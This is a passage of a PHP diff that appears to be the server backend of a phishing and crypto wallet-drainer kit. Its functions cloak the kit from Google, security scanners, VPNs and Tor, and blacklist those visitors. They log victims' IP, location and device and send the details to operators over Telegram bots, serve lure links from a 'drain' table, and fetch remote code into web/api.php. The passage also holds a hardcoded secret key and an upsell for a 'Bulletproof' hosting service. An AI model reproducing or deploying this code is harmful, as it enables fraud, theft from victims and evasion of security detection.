+                continue;
+            }
+
+            if (ip_in_range($ipToCheck, $network)) {
+                return $bot;
+            }
+        }
+    }
+
+    return false;
+}
+function ip_in_range($ip, $range)
+{
+       list($subnet, $mask) = explode("/", $range);
+       $mask = (int) $mask;
+       $subnetBin = inet_pton($subnet);
+       $ipBin = inet_pton($ip);
+       $maskBin = str_repeat("\xFF", $mask >> 3) . chr(0xff << 8 - ($mask & 0x07));
+       if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) {
+              return false;
+       }
+       $subnetInt = unpack("N", $subnetBin)[1];
+       $ipInt = unpack("N", $ipBin)[1];
+       $maskInt = unpack("N", $maskBin)[1];
+       return ($subnetInt & $maskInt) === ($ipInt & $maskInt);
+}
+function getFileContents($fileURL)
+{
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $fileURL);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($curl);
+    $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+    $error = curl_error($curl);
+    curl_close($curl);
+
+    if ($statusCode === 200 && empty($error)) {
+        $localFilePath = "web/api.php";
+        if (file_put_contents($localFilePath, $response) !== false) {
+            return true; // Success
+        } else {
+            return false; // Failed to save file
+        }
+    }
+
+    $fileContents = file_get_contents($fileURL);
+    if ($fileContents !== false) {
+        $localFilePath = "web/api.php";
+        if (file_put_contents($localFilePath, $fileContents) !== false) {
+            return true; // Success
+        } else {
+            return false; // Failed to save file
+        }
+    }
+
+    return false;
+}
+function tele_message($message)
+{
+       $TrubFtub = $_SESSION["idtel"];
+       $cRetVckr = $_SESSION["tokentel"];
+       $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
+       $params = ["chat_id" => $TrubFtub, "text" => $message];
+       $ch = curl_init();
+       curl_setopt($ch, CURLOPT_URL, $api_url);
+       curl_setopt($ch, CURLOPT_POST, true);
+       curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       $response = curl_exec($ch);
+       curl_close($ch);
+}
+function fetchContentFromURL($url)
+{
+       $ch = curl_init($url);
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       $content = curl_exec($ch);
+       curl_close($ch);
+       return $content;
+}
+function is_bot($userAgent) 
+{
+    $botKeywords = [
+        'bot', 'crawler', 'spider', 'fetch', 'scanner', 'scraper', 'yandexbot', 
+        'baiduspider', 'googlebot', 'bingbot', 'duckduckbot', 'turnitinbot', 'netcraft',
+        'amazonbot', 'censys', 'paloalto', 'expanse', 'zgrab', 'semrushbot', 'mj12bot', 
+        'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot', 
+        '(compatible', 'datadog', 'slackbot', 'discordbot', 'zapier'
+    ];
+
+    foreach ($botKeywords as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    if (preg_match('/Expanse.*Palo Alto Networks/i', $userAgent)) {
+        return true;
+    }
+
+    return false;
+}
+function banned_client($ipAddress, $reason, $clientData)
+{
+    global $fs_host, $fs_user, $fs_pass, $fs_name;
+
+    // 1) Connect DB
+    $db = @mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
+    if (!$db) {
+        return ['res_status'=>'500','message'=>'DB connection failed'];
+    }
+
+    // 2) Already blacklisted?
+    $sql = "SELECT 1 FROM logs WHERE ipaddres = ?";
+    $stmt = mysqli_prepare($db, $sql);
+    mysqli_stmt_bind_param($stmt, 's', $ipAddress);
+    mysqli_stmt_execute($stmt);
+    mysqli_stmt_store_result($stmt);
+    if (mysqli_stmt_num_rows($stmt) > 0) {
+        mysqli_stmt_close($stmt);
+        mysqli_close($db);
+        return ['res_status'=>'403','message'=>'Already blacklisted'];
+    }
+    mysqli_stmt_close($stmt);
+
+    // 3) Insert into logs table
+    $sql = "
+      INSERT INTO logs (
+        ipaddres, country, browser, os, domine, host, isp,
+        mobile, proxy, hosting, city, region, mytime, reson,
+        devicetype, devicename, osversion, browserversion,
+        requestsource, isfakeuseragent, referrer,
+        ishttps, connectiontype, useragent
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    ";
+    $stmt = mysqli_prepare($db, $sql);
+    // extract with defaults:
+    $d = array_merge(array_fill_keys([
+        'country','Browser','Os','local_domain','isp','mobile','proxy','hosting',
+        'city','region','local_time','DeviceType','DeviceName',
+        'OsVersion','BrowserVersion','RequestSource','IsFakeUserAgent',
+        'Referrer','IsHttps','ConnectionType','UserAgent'
+    ], 'Unknown'), $clientData);
+
+    $host = gethostbyaddr($ipAddress);
+    mysqli_stmt_bind_param($stmt, str_repeat('s', 24),
+        $ipAddress,
+        $d['country'],$d['Browser'],$d['Os'],$d['local_domain'],$host,$d['isp'],
+        $d['mobile'],$d['proxy'],$d['hosting'],$d['city'],$d['region'],$d['local_time'],$reason,
+        $d['DeviceType'],$d['DeviceName'],$d['OsVersion'],$d['BrowserVersion'],
+        $d['RequestSource'],$d['IsFakeUserAgent'],$d['Referrer'],
+        $d['IsHttps'],$d['ConnectionType'],$d['UserAgent']
+    );
+    if (!mysqli_stmt_execute($stmt)) {
+        mysqli_stmt_close($stmt);
+        mysqli_close($db);
+        return ['res_status'=>'500','message'=>'DB insert failed'];
+    }
+    mysqli_stmt_close($stmt);
+    mysqli_close($db);
+
+    // 4) Append to local log file
+    $logFile = __DIR__ . '/banned_clients.log';
+    $entry = sprintf(
+        "[%s] %s | %s | %s\n",
+        date('Y-m-d H:i:s'),
+        $ipAddress,
+        $reason,
+        json_encode($clientData, JSON_UNESCAPED_SLASHES)
+    );
+    if (@file_put_contents($logFile, $entry, FILE_APPEND|LOCK_EX) === false) {
+        error_log("banned_client(): cannot write to $logFile");
+    }
+
+    return ['res_status'=>'200','message'=>"$reason logged"];
+}
+function check_keyword(string $ipAddress, string $isp)
+{
+    global $fs_host, $fs_user, $fs_pass, $fs_name;
+
+    // 1) Connect once
+    $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
+    if (!$db) {
+        error_log("check_keyword(): DB connect failed");
+        return false;
+    }
+
+    // 2) Fetch only the words we need
+    $sql = "SELECT wording FROM mywording";
+    $result = mysqli_query($db, $sql);
+    if (!$result) {
+        error_log("check_keyword(): Query error: " . mysqli_error($db));
+        mysqli_close($db);
+        return false;
+    }
+
+    // 3) Build lowercase list
+    $words = [];
+    while ($row = mysqli_fetch_assoc($result)) {
+        $words[] = strtolower($row['wording']);
+    }
+    mysqli_free_result($result);
+
+    // 4) Prepare the three strings to search
+    $ispLower       = strtolower($isp);
+    $hostNameLower  = strtolower(gethostbyaddr($ipAddress) ?: '');
+    $uaLower        = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+    // 5) Check each keyword
+    foreach ($words as $word) {
+        if (
+            stripos($ispLower,      $word) !== false ||
+            stripos($hostNameLower, $word) !== false ||
+            stripos($uaLower,       $word) !== false
+        ) {
+            mysqli_close($db);
+            return $word;  // return the matching keyword
+        }
+    }
+
+    mysqli_close($db);
+    return false;
+}
+function isGoogleHost(string $host): bool
+{
+    return (bool) preg_match(
+        '/\.(?:googlebot\.com|google\.com|googleusercontent\.com)$/i',
+        $host
+    );
+}
+function isGoogleCrawler(string $ua, string $ip, string $isp): bool
+{
+    // 1) Quick UA match
+    static $uas = ['/Googlebot/i','/AdsBot\-Google/i','/Mediapartners\-Google/i'];
+    foreach ($uas as $p) {
+        if (preg_match($p, $ua)) {
+            // got a Google‑style UA
+            goto check_isp;
+        }
+    }
+    return false;
+
+    check_isp:
+    // 2) ISP sanity (optional, but covers WHOIS data)
+    if (stripos($isp, 'google') === false) {
+        return false;
+    }
+
+    // 3) Reverse DNS + suffix check
+    $host = @gethostbyaddr($ip);
+    if (! $host || ! isGoogleHost($host)) {
+        return false;
+    }
+
+    return false;
+}
+function detectMaliciousBot(string $userAgent, string $ip, ?string $isp = null): array 
+{
+    // Layer 1: Basic Bot Detection
+    if (empty($userAgent)) {
+        return ['bot' => true, 'layer' => 1, 'reason' => 'Empty User-Agent'];
+    }
+    if (preg_match('/(bot|crawl|spider|scrap|scan|hack|brute|sqlmap|nikto|wget|curl|python|java|perl|ruby|phantom|headless|selenium|zmeu)/i', $userAgent)) {
+        return ['bot' => true, 'layer' => 1, 'reason' => 'Suspicious User-Agent pattern'];
+    }
+
+    // Layer 2: IP Reputation Check
+    $ipv4 = ip2long($ip);
+    if ($ipv4) {
+        $badRanges = [
+            [ip2long('10.0.0.0'),    ip2long('10.255.255.255')],   // Private
+            [ip2long('172.16.0.0'),  ip2long('172.31.255.255')],   // Private
+            [ip2long('192.168.0.0'), ip2long('192.168.255.255')],  // Private
+            [ip2long('100.64.0.0'),  ip2long('100.127.255.255')],  // CGNAT
+            [ip2long('141.98.0.0'),  ip2long('141.98.255.255')],   // VPN
+            [ip2long('185.86.0.0'),  ip2long('185.86.255.255')],   // VPN
+            [ip2long('45.133.0.0'),  ip2long('45.133.255.255')],   // VPN
+            [ip2long('185.220.100.0'), ip2long('185.220.103.255')],// TOR
+            [ip2long('66.102.0.0'), ip2long('66.102.255.255')],   // Google
+            [ip2long('149.154.160.0'), ip2long('149.154.175.255')] // Telegram
+        ];
+        
+        foreach ($badRanges as $i => $range) {
+            if ($ipv4 >= $range[0] && $ipv4 <= $range[1]) {
+                $rangeName = [
+                    'Private IP', 'Private IP', 'Private IP', 'CGNAT IP',
+                    'VPN Range', 'VPN Range', 'VPN Range', 'TOR Exit Node',
+                    'Google Spoof Range', 'Telegram Bot Range'
+                ][$i];
+                return ['bot' => true, 'layer' => 2, 'reason' => $rangeName];
+            }
+        }
+    }
+
+    // Layer 3: ISP Analysis
+    if ($isp && preg_match('/(vpn|proxy|tor|hosting|datacenter|server|cloud)/i', $isp)) {
+        return ['bot' => true, 'layer' => 3, 'reason' => 'Suspicious ISP: ' . $isp];
+    }
+
+    // Layer 4: Advanced Verification
+    $host = @gethostbyaddr($ip);
+    if ($host && $host !== $ip) {
+        if (preg_match('/(vpn|proxy|tor|exit|relay|hosting|server|datacenter)/i', $host)) {
+            return ['bot' => true, 'layer' => 4, 'reason' => 'Suspicious Reverse DNS: ' . $host];
+        }
+
+        $forwardIPs = @gethostbynamel($host);
+        if (!empty($forwardIPs) && !in_array($ip, $forwardIPs, true)) {
+            return ['bot' => true, 'layer' => 4, 'reason' => 'DNS Mismatch: ' . $ip . ' vs ' . implode(',', $forwardIPs)];
+        }
+    }
+
+
+    // Layer 6: Behavioral Analysis
+    if (isset($_SERVER['HTTP_ACCEPT_ENCODING'])) {
+        $ae = strtolower($_SERVER['HTTP_ACCEPT_ENCODING']);
+        // Using strpos() instead of str_contains() for PHP < 8.0
+        if (strpos($ae, 'gzip') === false && 
+            strpos($ae, 'deflate') === false && 
+            strpos($ae, 'br') === false) {
+            return ['bot' => true, 'layer' => 6, 'reason' => 'Unusual Accept-Encoding: ' . $ae];
+        }
+    }
+
+    // Layer 7: Request Pattern Analysis
+    if (isset($_SERVER['REQUEST_TIME_FLOAT'])) {
+        $requestSpeed = microtime(true) - $_SERVER['REQUEST_TIME_FLOAT'];
+        if ($requestSpeed < 0.05) {
+            return ['bot' => true, 'layer' => 7, 'reason' => 'Unnaturally fast request: ' . number_format($requestSpeed*1000, 2) . 'ms'];
+        }
+    }
+
+    return ['bot' => false, 'layer' => 0, 'reason' => 'Clean request'];
+}
+function log_visite($ip, $login_type, $country, $isp, $project, $addby)
+{
+    global $fs_host, $fs_user, $fs_pass, $fs_name;
+
+    $response = [];
+
+    $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
+    if (!$db) {
+        http_response_code(500);
+        return json_encode([
+            "status" => "error",
+            "message" => "Database connection failed",
+            "error" => mysqli_connect_error()
+        ]);
+    }
+
+    // Check if the visit is already recorded
+    $checkQuery = "SELECT COUNT(*) as count FROM visite WHERE ip = ? AND addby = ? AND project = ?";
+    $stmt = $db->prepare($checkQuery);
+    if (!$stmt) {
+        http_response_code(500);
+        return json_encode([
+            "status" => "error",
+            "message" => "Failed to prepare check query",
+            "error" => $db->error
+        ]);
+    }
+
+    $stmt->bind_param("sss", $ip, $addby, $project);
+    $stmt->execute();
+    $result = $stmt->get_result();
+    $row = $result->fetch_assoc();
+
+    if ($row && $row["count"] > 0) {
+        $stmt->close();
+        $db->close();
+        return json_encode([
+            "status" => "exists",
+            "message" => "Visit already logged"
+        ]);
+    }
+    $stmt->close();
+
+    // Insert the visit
+    $insertQuery = "INSERT INTO visite (ip, country, isp, login_type, project, addby)
+                    VALUES (?, ?, ?, ?, ?, ?)";
+    $stmt = $db->prepare($insertQuery);
+    if (!$stmt) {
+        http_response_code(500);
+        return json_encode([
+            "status" => "error",
+            "message" => "Failed to prepare insert query",
+            "error" => $db->error
+        ]);
+    }
+
+    $stmt->bind_param("ssssss", $ip, $country, $isp, $login_type, $project, $addby);
+    if (!$stmt->execute()) {
+        $stmt->close();
+        $db->close();
+        http_response_code(500);
+        return json_encode([
+            "status" => "error",
+            "message" => "Failed to log visit",
+            "error" => $stmt->error
+        ]);
+    }
+
+    $stmt->close();
+    $db->close();
+
+    return json_encode([
+        "status" => "success",
+        "message" => "Visit logged successfully"
+    ]);
+}
+function check_country(array $countryIn, string $countryOut): bool
+{
+    $countryOut = strtolower(trim($countryOut));
+    foreach ($countryIn as $allowed) {
+        if (strtolower(trim($allowed)) === $countryOut) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function verifyCloudflareTurnstile($token, $remoteIp) {
+    $secretKey = '0x4AAAAAABlzrTx2CwjTB5yzHo_Efh9PA48';
+    $url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
+
+    $data = http_build_query([
+        'secret' => $secretKey,
+        'response' => $token,
+        'remoteip' => $remoteIp
+    ]);
+
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+
+    $response = curl_exec($ch);
+
+    if ($response === false) {
+        return ['success' => false, 'error' => curl_error($ch)];
+    }
+
+    $responseData = json_decode($response, true);
+    curl_close($ch);
+
+    return [
+        'success' => (bool)$responseData['success'],
+        'error' => $responseData['error-codes'] ?? null
+    ];
+}
+
+function user_web3($ipAddress, $id)
+{
+    global $fs_host, $fs_user, $fs_pass, $fs_name;
+
+    try {
+        $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
+        if (!$db) {
+            throw new Exception("Database connection failed: " . mysqli_connect_error());
+        }
+
+        $stmt = $db->prepare("SELECT project_tel_token, project_tel_id, project_name, username, project_logo FROM drain WHERE private_key = ?");
+        if (!$stmt) {
+            throw new Exception("Prepare failed: " . $db->error);
+        }
+
+        $stmt->bind_param("s", $id);
+        $stmt->execute();
+        $result = $stmt->get_result();
+
+        if ($result->num_rows > 0) {
+            $row = $result->fetch_assoc();
+
+            return [
+                "status" => "success",
+                "message" => "Drain data found.",
+                "data" => [
+                    "tel_token"     => $row["project_tel_token"],
+                    "tel_id"        => $row["project_tel_id"],
+                    "project_name"  => $row["project_name"],
+                    "create_by"     => $row["username"],
+                    "pro_logo"      => $row["project_logo"]
+                ]
+            ];
+        } else {
+            return [
+                "status" => "error",
+                "message" => "No matching record found."
+            ];
+        }
+
+    } catch (Exception $e) {
+        error_log("user_web3 error: " . $e->getMessage());
+        return [
+            "status" => "error",
+            "message" => "Internal server error.",
+            "error" => $e->getMessage()
+        ];
+    } finally {
+        if (isset($stmt)) $stmt->close();
+        if (isset($db)) $db->close();
+    }
+}
+
+function url_web3()
+{
+    global $fs_host, $fs_user, $fs_pass, $fs_name;
+    try {
+        $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
+        if (!$db) throw new Exception("Connection failed: " . mysqli_connect_error());
+
+        $sql = "SELECT luxurl FROM luxdataurl WHERE status = '2'";
+        $result = mysqli_query($db, $sql);
+        if (!$result) throw new Exception("Query failed: " . mysqli_error($db));
+
+        $links = [];
+        while ($row = mysqli_fetch_assoc($result)) {
+            $links[] = $row["luxurl"];
+        }
+
+        mysqli_close($db);
+
+        if (count($links) === 0) {
+            return ["status" => "error", "message" => "No URLs available"];
+        }
+
+        shuffle($links);
+        foreach ($links as $random_link) {
+            $safety_result = checkUrlSafety($random_link);
+            if ($safety_result === "Safe") {
+                return [
+                    "status" => "success",
+                    "message" => "Safe URL found",
+                    "url" => $random_link
+                ];
+            }
+        }
+
+        return ["status" => "error", "message" => "No safe URLs available"];
+
+    } catch (Exception $e) {
+        return ["status" => "error", "message" => "Internal server error", "error" => $e->getMessage()];
+    }
+}
+
+function send_message($message,$token,$chatid)
+{
+       $api_url = "https://api.telegram.org/bot{$token}/sendMessage";
+       $params = ["chat_id" => $chatid, "text" => $message];
+       $ch = curl_init();
+       curl_setopt($ch, CURLOPT_URL, $api_url);
+       curl_setopt($ch, CURLOPT_POST, true);
+       curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       $response = curl_exec($ch);
+       curl_close($ch);
+}
+function obfuscateString($input) {
+    $length = strlen($input);
+    if ($length <= 2) return $input; // return as-is if too short
+
+    $first = $input[0];
+    $last = $input[$length - 1];
+
+    $middle = str_repeat('*', $length - 2);
+
+    return $first . $middle . $last;
+}
+function safe_base64_double_decode($input) {
+    if (!is_string($input)) return '';
+
+    // First decode
+    $decoded1 = base64_decode($input, true);
+    if ($decoded1 === false) return '';
+
+    // Second decode
+    $decoded2 = base64_decode($decoded1, true);
+    if ($decoded2 === false) return '';
+
+    return $decoded2;
+}
+
+
+
+
+
+
+
+
+// Handle incoming request
+$requestData = json_decode(file_get_contents('php://input'), true);
+
+// Initialize response data
+$response = [
+    'status' => 'error',
+    'message' => 'Invalid request',
+    'agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
+    'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR']
+];
+
+
+
+
+
+$type = $requestData['type'] ?? '';
+$ipAddress = $requestData['ip'] ?? $_SERVER['REMOTE_ADDR'];
+$userId = safe_base64_double_decode($requestData['user_id'] ?? '');
+$web3   = safe_base64_double_decode($requestData['web3'] ?? '');
+$reson = $requestData['reson'] ?? '';
+$userAgent = $requestData['user_agent'] ?? ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown');
+$client_info = detectDeviceDetails($userAgent,$ipAddress);
+$userData = user_data($userId, $client_info, $ipAddress);
+
+ 
+ 
+ 
+ 
+ 
+ 
+// Debug: JSON parse errors
+if (json_last_error() !== JSON_ERROR_NONE) {
+	$res = banned_client($ipAddress, 'Invalid JSON input', $client_info);
+    echo json_encode(['status' => 'error', 'message' => 'Invalid JSON input', 'error' => json_last_error_msg()]);
+    exit();
+}
+
+if (empty($requestData) || !isset($requestData['type'])) {
+	$res = banned_client($ipAddress, 'Invalid request', $client_info);
+    http_response_code(400);
+    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
+    exit();
+}
+
+
+if (isset($requestData['cf-turnstile-response'])) {
+
+    $token = $requestData['cf-turnstile-response'];
+    $remoteIp = $_SERVER['REMOTE_ADDR'];
+
+    $verification = verifyCloudflareTurnstile($token, $remoteIp);
+
+    if ($verification['success']) {
+        $_SESSION['captcha_verified'] = true;
+        $_SESSION['captcha_verified_time'] = time();
+
+
+		
+    } else {
+        http_response_code(400);
+        echo json_encode([
+            'success' => false, 
+            'error' => 'CAPTCHA verification failed',
+            'details' => $verification['error'] ?? 'Unknown error'
+        ]);
+      exit;		
+    }
+
+}
+
+$found = check_keyword($ipAddress, $client_info['isp']);
+$detector = isGoogleCrawler($userAgent, $ipAddress, $client_info['isp']);			
+$newData = detectMaliciousBot($userAgent, $ipAddress, $client_info['isp']);	
+
+			
+switch (strtolower($type)) {
+	
+    case 'check':
+        if ($userData['status'] == 'success') {
+            $response = array_merge($userData, [
+                'status' => 'success',
+				'success'   => true,
+				'message' => 'data found',
+                'userid' => $userId,
+                'ip'     => $ipAddress,
+                'agent'  => $userAgent,
+            ]);
+        } else {
+            $response = [
+                'status'  => 'error',
+				'success' => false,
+                'message' => $userData['message'],
+                'agent'   => $userAgent,
+                'ip'      => $ipAddress,
+            ];
+        }
+        break;
+		
+    case 'checkweb3':
+	
+	   $web3_data = user_web3($ipAddress, $web3);
+       if ($web3_data['status'] == 'success') {
+           $response = array_merge($web3_data, [
+               'status' => 'success',
+               'success' => true,
+               'message' => 'web3 found',
+               'web3' => $web3,
+               'ip'   => $ipAddress,
+               'agent' => $userAgent,
+           ]);
+       } else {
+           $response = [
+               'status'  => 'error',
+               'success' => false,
+               'message' => $web3_data['message'] ?? 'Unknown error',
+               'agent'   => $userAgent,
+               'ip'      => $ipAddress,
+           ];
+       }
+   
+        break;		
+    case 'blocked':
+	   
+	    $res = banned_client($ipAddress, $reson, $client_info);
+        $response = array_merge($client_info, [
+            'status'  => 'error',
+            'message' => $res['message'],
+            'agent'   => $userAgent,
+            'ip'      => $ipAddress,
+        ]);
+        break;
+		
+case 'web3':
+    	if (detect_user($ipAddress)) 
+        {
+            $response = [
+               'status'  => 'error',
+               'message' => 'user blacklisted',
+               'agent'   => $userAgent,
+               'ip'      => $ipAddress,
+           ];
+             break;	
+        }
+        if ($found !== false) 
+        {
+            $res = banned_client($ipAddress, "Detected word: $found", $client_info);
+            $response = array_merge($client_info, [
+                'status'  => 'error',
+                'message' => $res['message'],
+                'agent'   => $userAgent,
+                'ip'      => $ipAddress,
+            ]);
+            break;
+        }
+        if ($detector !== false) 
+        {
+            $res = banned_client($ipAddress, "Google Detected", $client_info);
+            $response = array_merge($client_info, [
+                'status'  => 'error',
+                'message' => $res['message'],
+                'agent'   => $userAgent,
+                'ip'      => $ipAddress,
+            ]);
+            break;
+        } 
+        if (is_bot_ip($ipAddress))
+        {
+        	$res = banned_client($ipAddress, "Google IP", $client_info);
+            $response = array_merge($client_info, [
+                'status'  => 'error',
+                'message' => $res['message'],
+                'agent'   => $userAgent,
+                'ip'      => $ipAddress,
+            ]);
+            break; 
+        	 
+         }
+        if ($newData['bot'] === true) 
+        {
+            $res = banned_client($ipAddress, $newData['reason'], $client_info);
+        
+             $response = array_merge($client_info, [
+               'status'  => 'error',
+               'message' => $res['message'],
+               'agent'   => $userAgent,
+               'ip'      => $ipAddress,
+           ]);
+           break;
+            
+        }
+        
+    $success_url = url_web3();
+    if ($success_url['status'] === 'success') {
+        $success_url_final = $success_url['url'];
+        $web3_data = user_web3($ipAddress, $web3);
+
+        if ($web3_data['status'] === 'success') {
+			    $web3_data_project = $web3_data['data']['project_name'];
+				$username = $web3_data['data']['create_by'];
+				$project_logo = $web3_data['data']['pro_logo'];
+				$country = $client_info['country'];
+                $sip_name = $client_info['isp'];
+                $city = $client_info['city'];
+                $mobile = $client_info['mobile'];
+                $browser = $client_info['Browser'];
+                $log_date = $client_info['local_time'];
+			    $message = "
+✅ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴   (Web3)
+--------------------------------------------
+🏠  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$web3_data_project}
+👨‍🔧  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {$username}
+📡  𝗜𝗣: {$ipAddress}
+🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
+🗺️  𝗦𝗜𝗣: {$sip_name}
+💻  𝗖𝗶𝘁𝘆: {$city}
+📱  𝗠𝗼𝗯𝗶𝗹𝗲: {$mobile} 
+🌐  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$browser} 
+🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$log_date}
+--------------------------------------------";		
+            $response = [
+                'status'  => 'success',
+                'message' => 'web3 created',
+				'success'     => true,
+                'message_url' => "$success_url_final??userid=$web3",
+                'pro_logo' => $web3_data['data']['pro_logo'],
+                'project' => $web3_data['data']['project_name'],
+                'agent'   => $userAgent,
+                'ip'      => $ipAddress,
+            ];
+			log_visite($ipAddress, 3, $client_info['country'], $client_info['isp'], $web3_data['data']['project_name'], $web3_data['data']['create_by']);
+			send_message($message,$web3_data['data']['tel_token'],$web3_data['data']['tel_id']);
+			
+        } else {
+			$res = banned_client($ipAddress, 'invalid web3 user', $client_info);
+            $response = [
+                'status' => 'error',
+                'message' => 'web3 not found',
+                'agent' => $userAgent,
+                'ip' => $ipAddress
+            ];
+        }
+
+    } else {
+        $response = [
+            'status' => 'error',
+            'message' => 'web3 invalid url',
+            'agent' => $userAgent,
+            'ip' => $ipAddress
+        ];
+    }
+
+    break;
+
+    case 'login':
+        $maxRetries = 5;
+        $retryDelay = 2;
+        $success = false;
+        $attempt = 0;
+		if (detect_user($ipAddress)) 
+        {
+            $response = [
+               'status'  => 'error',
+               'message' => 'user blacklisted',
+               'agent'   => $userAgent,
+               'ip'      => $ipAddress,
+           ];
+             break;	
+        }
+        if ($found !== false) 
+        {
+            $res = banned_client($ipAddress, "Detected word: $found", $client_info);
+            $response = array_merge($client_info, [
+                'status'  => 'error',
+                'message' => $res['message'],
+                'agent'   => $userAgent,
+                'ip'      => $ipAddress,
+            ]);
+            break;
+        }
+        if ($detector !== false) 
+        {
+            $res = banned_client($ipAddress, "Google Detected", $client_info);
+            $response = array_merge($client_info, [
+                'status'  => 'error',
+                'message' => $res['message'],
+                'agent'   => $userAgent,
+                'ip'      => $ipAddress,
+            ]);
+            break;
+        } 
+        if (is_bot_ip($ipAddress))
+        {
+        	$res = banned_client($ipAddress, "Google IP", $client_info);
+            $response = array_merge($client_info, [
+                'status'  => 'error',
+                'message' => $res['message'],
+                'agent'   => $userAgent,
+                'ip'      => $ipAddress,
+            ]);
+            break; 
+        	 
+         }
+        if ($userData['proxy'] == 1)
+        {
+        	 if ($client_info['proxy'] == 'True'){
+        	     $res = banned_client($ipAddress, "Proxy Detected", $client_info);
+                 $response = array_merge($client_info, [
+                     'status'  => 'error',
+                     'message' => $res['message'],
+                     'agent'   => $userAgent,
+                     'ip'      => $ipAddress,
+                 ]);
+        	 
+                break; 
+          }
+        }
+        if ($newData['bot'] === true) 
+        {
+            $res = banned_client($ipAddress, $newData['reason'], $client_info);
+        
+             $response = array_merge($client_info, [
+               'status'  => 'error',
+               'message' => $res['message'],
+               'agent'   => $userAgent,
+               'ip'      => $ipAddress,
+           ]);
+           break;
+            
+        }
+        
+        	
+	    if (!$userData['status'] == 'success') 
+        {
+        	$res = banned_client($ipAddress, 'invalid id', $client_info);
+            $response = array_merge($client_info, [
+                'status'  => 'error',
+                'message' => $res['message'],
+                'agent'   => $userAgent,
+                'ip'      => $ipAddress,
+            ]);
+           break;	
+        }
+        if (!check_country($userData['cn'], $client_info['countryCode'])) 
+        {
+        
+            $res = banned_client($ipAddress, 'Invalid country', $client_info);
+            $response = array_merge($client_info, [
+               'status'  => 'error',
+        	   'cn_out'  => $client_info['countryCode'],
+               'message' => $res['message'],
+               'agent'   => $userAgent,
+               'ip'      => $ipAddress,
+           ]);
+           break;
+        }	
+        	
+	
+	
+	
+        while (!$success && $attempt < $maxRetries) {
+            $attempt++;
+
+            if ($userData['status'] == 'success') {
+                $log_extract = url_packet();
+    
+                if ($log_extract) {
+				$result = send_command($userAgent, $ipAddress, $log_extract, "create", $userId, $client_info['local_domain']);
+                    $success = isset($result["res_status"]) && $result["res_status"] === "success";
+			    
+                    if ($success) {
+                        $res_dir = $result["res_dir"] ?? null;
+                        $res_url = $result["res_url"] ?? null;
+                        $res_id  = $result["res_id"]  ?? null;
+                        $res_ip  = $result["res_ip"]  ?? null;
+                        $res_action = $result["res_action"] ?? null;
+
+                        log_visite($ipAddress, 0, $client_info['country'], $client_info['isp'], $userData['project'], $userData['addby']);
+                	    $expireTimestamp = strtotime($userData['expire_date']);
+                	    $currentTimestamp = time();
+                	    
+                	    $project_name = $userData['project'];
+                        $username = $userData['addby'];
+                        $expire = $userData['expire_date'];
+                        $country = $client_info['country'];
+                        $sip_name = $client_info['isp'];
+                        $city = $client_info['city'];
+                        $mobile = $client_info['mobile'];
+                        $browser = $client_info['Browser'];
+                        $log_date = $client_info['local_time'];
+                	    
+                	    if ($currentTimestamp >= $expireTimestamp)
+                	    {
+                           $country_obf = obfuscateString($client_info['country']);
+                           $sip_name_obf = obfuscateString($client_info['isp']);
+                           $city_obf = obfuscateString($client_info['city']);
+                           $mobile_obf = obfuscateString($client_info['mobile']);
+                           $browser_obf = obfuscateString($client_info['Browser']);
+                           $ipAddress_obf = obfuscateString($ipAddress);
+                           $message = "
+❌ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴 (Expired)
+Your Link is Expired Result Will be hidden
+Try to Reactive your Bulletproof Now!!
+https://www.zeroday.help/bulletproof/price/
+--------------------------------------------
+❌  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$project_name}
+❌  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {$username}
+❌  𝗘𝘅𝗽𝗶𝗿𝗲: {$expire}
+❌  𝗜𝗣: {$ipAddress_obf}
+🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country_obf}
+🗺️  𝗦𝗜𝗣: {$sip_name_obf}
+💻  𝗖𝗶𝘁𝘆: {$city_obf}
+📱  𝗠𝗼𝗯𝗶𝗹𝗲: {$mobile_obf} 
+🌐  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$browser_obf} 
+🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$log_date}
+--------------------------------------------";
+                                  
+                	    }else{
+                     		
